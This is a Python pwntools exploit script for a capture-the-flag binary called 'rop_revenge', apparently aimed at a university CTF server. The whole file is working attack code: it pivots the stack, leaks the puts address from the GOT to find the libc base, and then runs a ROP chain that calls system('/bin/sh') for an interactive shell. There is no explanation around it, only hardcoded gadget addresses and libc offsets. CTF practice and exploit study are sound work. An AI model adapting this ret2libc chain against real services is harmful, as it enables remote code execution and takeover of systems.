from pwn import *

r = remote("ctf.adl.csie.ncu.edu.tw", 11009)
# r = process("./rop_revenge", env={"LD_PRELOAD":"./libc.so.6"})
# r = remote("127.0.0.1", 8888)
context.arch = "amd64"

# buf1 = 0x00602000 - 0x200
# buf2 = buf1 + 0x100
buf1 = 0x601180
buf2 = buf1 + 0x200
puts_plt = 0x0000000000400500
read_plt = 0x0000000000400520
puts_got = 0x0000000000601018
read_got = 0x601028

# libc.so.6
puts_off = 0x6f5d0
system_off = 0x45380

# rop
pop_rdi = 0x0000000000400743
pop_rsi_r15 = 0x0000000000400741
leave_ret = 0x00000000004006d4

rop1 = "a" * 0x100 + flat([buf2, pop_rdi, puts_got, puts_plt, 0x40073a, 20, 21, buf1, 0x100, buf2, 0, 0x400720, 0, 0, buf2, 0, 0, 0, 0, leave_ret, read_plt])
r.recvuntil("?\n")
r.sendline(rop1)
# gdb.attach(r)
payload = "a" * 32 + flat([buf1, leave_ret])
r.recvuntil("say?\n")
r.send(payload)

r.recvuntil("~\n")
puts = u64(r.recvuntil("\n").strip().ljust(8, "\x00"))
libc = puts - puts_off
system = libc + system_off

rop2 = flat([buf1, pop_rdi, buf2 + 32, system, "/bin/sh\x00"])
r.sendline(rop2)

r.interactive()

